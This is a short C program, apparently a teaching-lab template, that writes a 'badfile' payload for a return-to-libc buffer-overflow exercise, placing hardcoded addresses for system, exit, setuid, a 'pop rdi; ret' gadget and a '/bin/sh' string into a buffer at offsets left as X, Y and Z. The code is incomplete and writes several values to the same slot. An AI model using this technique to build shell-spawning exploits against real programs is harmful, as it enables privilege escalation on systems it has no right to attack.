#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int main(int argc, char ** argv)
{
char buf[40];
FILE * badfile;
badfile = fopen("./badfile", "w");
/*
You need to decide the addresses and
the values for X, Y, Z etc.
*/
*(long *) &buf[X] = 0x7ffff7a53390 ;//system
*(long *) &buf[Y] =  0x7ffff7a48030 ;//exit
*(long *) &buf[Z] =  0x7ffff7ada700;//setuid
*(long *) &buf[Z] =  0x000006e30000;//pop rdi; ret
*(long *) &buf[Z] =  0x7fffffffee37;//bin/sh/0
fwrite(buf, sizeof(buf), 1, badfile);
fclose(badfile);
}
